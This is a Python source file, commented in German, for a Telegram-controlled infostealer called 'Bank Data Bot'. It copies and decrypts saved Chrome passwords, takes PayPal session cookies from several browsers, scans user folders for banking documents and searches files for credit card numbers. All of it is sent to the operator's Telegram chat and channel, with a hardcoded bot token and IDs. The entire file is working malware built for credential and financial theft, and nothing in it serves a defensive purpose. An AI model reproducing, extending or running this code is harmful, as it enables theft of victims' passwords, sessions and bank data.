#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
telegram_bank_bot.py - Bankdaten Sammler über Telegram
Nur ein Telegram Bot Token
"""

import os
import sys
import json
import re
import sqlite3
import telebot
from telebot import types
import threading
import time
from datetime import datetime
import browser_cookie3
import win32crypt
import shutil
import base64

# ==================== KONFIGURATION ====================
BOT_TOKEN = "8746163440:AAFbrUUlkEal0eidxekyBH1yrDREow4JtEo"  # Spezieller Bot für Bankdaten
MASTER_ID = "6976176725"
CHANNEL_ID = "-1003734383961"

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== BANK DATA FUNCTIONS ====================
def get_chrome_passwords():
    """Holt gespeicherte Passwörter aus Chrome"""
    data = []
    try:
        # Chrome Passwort-Datenbank
        chrome_path = os.path.join(os.environ['USERPROFILE'], 
                                  'AppData', 'Local', 'Google', 'Chrome', 
                                  'User Data', 'Default', 'Login Data')
        
        if os.path.exists(chrome_path):
            shutil.copy2(chrome_path, "chrome_passwords.db")
            
            conn = sqlite3.connect("chrome_passwords.db")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                try:
                    # Versuch Entschlüsselung
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    password = password.decode('utf-8')
                except:
                    password = "[ENCRYPTED]"
                
                if url and username:
                    data.append({
                        'url': url,
                        'username': username,
                        'password': password
                    })
            
            conn.close()
            os.remove("chrome_passwords.db")
        
        return data
    except Exception as e:
        return [{"error": str(e)}]

def get_cookies():
    """Holt Browser Cookies"""
    cookies = []
    try:
        for browser in [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge]:
            try:
                cj = browser(domain_name='.paypal.com')
                for cookie in cj:
                    if any(keyword in cookie.name.lower() for keyword in ['session', 'token', 'auth', 'login']):
                        cookies.append({
                            'domain': cookie.domain,
                            'name': cookie.name,
                            'value': cookie.value[:50] + '...' if len(cookie.value) > 50 else cookie.value
                        })
            except:
                pass
        return cookies
    except Exception as e:
        return [{"error": str(e)}]

def scan_for_bank_files():
    """Scannt nach Bankdateien"""
    bank_files = []
    extensions = ['.pdf', '.txt', '.csv', '.xls', '.xlsx', '.doc', '.docx']
    keywords = ['bank', 'konto', 'iban', 'bic', 'visa', 'mastercard', 'paypal', 
                'kreditkarte', 'passwort', 'pin', 'tan', 'überweisung']
    
    search_paths = [
        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
        os.path.join(os.environ['USERPROFILE'], 'Documents'),
        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
        os.path.join(os.environ['USERPROFILE'], 'OneDrive')
    ]
    
    for path in search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in extensions):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read(5000).lower()
                                if any(keyword in content for keyword in keywords):
                                    bank_files.append({
                                        'path': filepath,
                                        'size': os.path.getsize(filepath),
                                        'found_keywords': [k for k in keywords if k in content]
                                    })
                        except:
                            pass
    
    return bank_files

def get_credit_card_info():
    """Scannt nach Kreditkarteninformationen"""
    # Pattern für Kreditkartennummern
    cc_patterns = [
        r'\b4[0-9]{12}(?:[0-9]{3})?\b',  # Visa
        r'\b5[1-5][0-9]{14}\b',          # MasterCard
        r'\b3[47][0-9]{13}\b',           # American Express
        r'\b6(?:011|5[0-9]{2})[0-9]{12}\b'  # Discover
    ]
    
    found_cards = []
    
    # Durchsuche Dokumente
    docs_path = os.path.join(os.environ['USERPROFILE'], 'Documents')
    if os.path.exists(docs_path):
        for root, dirs, files in os.walk(docs_path):
            for file in files:
                if file.endswith(('.txt', '.doc', '.docx', '.pdf')):
                    try:
                        filepath = os.path.join(root, file)
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            for pattern in cc_patterns:
                                matches = re.findall(pattern, content)
                                for match in matches:
                                    found_cards.append({
                                        'file': filepath,
                                        'number': match[:4] + '********' + match[-4:],
                                        'type': 'Visa' if match.startswith('4') else 
                                               'MasterCard' if match.startswith('5') else
                                               'Amex' if match.startswith('3') else 'Discover'
                                    })
                    except:
                        pass
    
    return found_cards

# ==================== TELEGRAM COMMANDS ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if str(message.chat.id) != MASTER_ID:
        return
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('🔐 Chrome Passwords')
    btn2 = types.KeyboardButton('🍪 Browser Cookies')
    btn3 = types.KeyboardButton('🏦 Bank Files Scan')
    btn4 = types.KeyboardButton('💳 Credit Cards')
    btn5 = types.KeyboardButton('💀 COLLECT ALL')
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(message.chat.id,
                    "🏦 **BANK DATA BOT** 🏦\n"
                    "Sammelt Bankdaten, Passwörter, Cookies",
                    parse_mode='Markdown',
                    reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    if str(message.chat.id) != MASTER_ID:
        return
    
    text = message.text
    
    if text == '🔐 Chrome Passwords':
        bot.send_message(message.chat.id, "🔍 Sammle Chrome Passwörter...")
        passwords = get_chrome_passwords()
        
        if passwords and len(passwords) > 0:
            for i, pwd in enumerate(passwords[:10]):  # Nur erste 10 senden
                msg = f"🔑 **Login {i+1}**\n"
                msg += f"URL: `{pwd.get('url', 'N/A')}`\n"
                msg += f"User: `{pwd.get('username', 'N/A')}`\n"
                msg += f"Pass: `{pwd.get('password', 'N/A')}`\n"
                bot.send_message(message.chat.id, msg, parse_mode='Markdown')
            
            if len(passwords) > 10:
                bot.send_message(message.chat.id, f"📊 Total: {len(passwords)} Passwörter gefunden")
            
            # An Channel senden
            if CHANNEL_ID:
                try:
                    data_str = json.dumps(passwords[:50], indent=2)
                    if len(data_str) > 4000:
                        # Als Datei senden
                        with open("passwords.json", "w") as f:
                            f.write(data_str)
                        with open("passwords.json", "rb") as f:
                            bot.send_document(CHANNEL_ID, f)
                        os.remove("passwords.json")
                    else:
                        bot.send_message(CHANNEL_ID, f"```json\n{data_str}\n```", parse_mode='Markdown')
                except:
                    pass
        else:
            bot.send_message(message.chat.id, "❌ Keine Passwörter gefunden")
    
    elif text == '🍪 Browser Cookies':
        bot.send_message(message.chat.id, "🍪 Sammle Cookies...")
        cookies = get_cookies()
        
        if cookies:
            msg = "**Gefundene Cookies:**\n"
            for cookie in cookies[:15]:
                msg += f"• {cookie['domain']}: {cookie['name']}\n"
            bot.send_message(message.chat.id, msg, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "❌ Keine relevanten Cookies gefunden")
    
    elif text == '🏦 Bank Files Scan':
        bot.send_message(message.chat.id, "🏦 Scanne nach Bankdateien...")
        bank_files = scan_for_bank_files()
        
        if bank_files:
            msg = f"📁 **Gefundene Bankdateien: {len(bank_files)}**\n"
            for file in bank_files[:10]:
                msg += f"• {os.path.basename(file['path'])} ({file['size']} bytes)\n"
                msg += f"  Keywords: {', '.join(file['found_keywords'][:3])}\n"
            bot.send_message(message.chat.id, msg, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "❌ Keine Bankdateien gefunden")
    
    elif text == '💳 Credit Cards':
        bot.send_message(message.chat.id, "💳 Suche nach Kreditkarten...")
        cards = get_credit_card_info()
        
        if cards:
            msg = f"💳 **Gefundene Kreditkarten: {len(cards)}**\n"
            for card in cards:
                msg += f"• {card['type']}: {card['number']}\n"
                msg += f"  Datei: {os.path.basename(card['file'])}\n"
            bot.send_message(message.chat.id, msg, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "❌ Keine Kreditkarten gefunden")
    
    elif text == '💀 COLLECT ALL':
        msg = bot.send_message(message.chat.id,
                              "💀 **SAMMLE ALLE DATEN** 💀\n"
                              "Dies kann mehrere Minuten dauern\n"
                              "Bestätige mit 'YES'",
                              parse_mode='Markdown')
        bot.register_next_step_handler(msg, collect_all_data)

def collect_all_data(message):
    if message.text.upper() != 'YES':
        bot.send_message(message.chat.id, "❌ Abgebrochen")
        return
    
    bot.send_message(message.chat.id, "💀 STARTE KOMPLETTE DATENSAMMLUNG...")
    
    # In Thread ausführen
    def collection_thread():
        try:
            # 1. Passwörter
            bot.send_message(MASTER_ID, "1/4 🔐 Sammle Passwörter...")
            passwords = get_chrome_passwords()
            
            # 2. Cookies
            bot.send_message(MASTER_ID, "2/4 🍪 Sammle Cookies...")
            cookies = get_cookies()
            
            # 3. Bankdateien
            bot.send_message(MASTER_ID, "3/4 🏦 Scanne Bankdateien...")
            bank_files = scan_for_bank_files()
            
            # 4. Kreditkarten
            bot.send_message(MASTER_ID, "4/4 💳 Suche Kreditkarten...")
            cards = get_credit_card_info()
            
            # Zusammenfassung
            summary = f"""
            📊 **DATENSAMMLUNG ABGESCHLOSSEN**
            
            🔐 Passwörter: {len(passwords) if isinstance(passwords, list) else 0}
            🍪 Cookies: {len(cookies) if isinstance(cookies, list) else 0}
            🏦 Bankdateien: {len(bank_files)}
            💳 Kreditkarten: {len(cards)}
            
            ⏰ Zeit: {datetime.now().strftime('%H:%M:%S')}
            """
            
            bot.send_message(MASTER_ID, summary, parse_mode='Markdown')
            
            # An Channel senden
            if CHANNEL_ID:
                all_data = {
                    'passwords': passwords[:100],
                    'cookies': cookies[:50],
                    'bank_files': bank_files[:50],
                    'credit_cards': cards,
                    'timestamp': datetime.now().isoformat(),
                    'host': os.environ.get('COMPUTERNAME', 'Unknown')
                }
                
                with open("all_data.json", "w") as f:
                    json.dump(all_data, f, indent=2)
                
                with open("all_data.json", "rb") as f:
                    bot.send_document(CHANNEL_ID, f, caption="📦 Komplette Datensammlung")
                
                os.remove("all_data.json")
        
        except Exception as e:
            bot.send_message(MASTER_ID, f"❌ Fehler: {str(e)}")
    
    thread = threading.Thread(target=collection_thread)
    thread.start()

# ==================== MAIN ====================
def main():
    print("😈 Bank Data Bot gestartet")
    
    try:
        bot.send_message(MASTER_ID, "✅ Bank Data Bot aktiv")
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"❌ Fehler: {e}")
        time.sleep(10)
        main()

if __name__ == "__main__":
    if BOT_TOKEN == "DEIN_MULEBOT_TOKEN_HIER":
        print("❌ Token nicht gesetzt!")
        sys.exit(1)
    
    # Windows-spezifische Imports
    try:
        import win32crypt
    except:
        print("⚠️ win32crypt nicht verfügbar - Passwortentschlüsselung eingeschränkt")
    
    main()
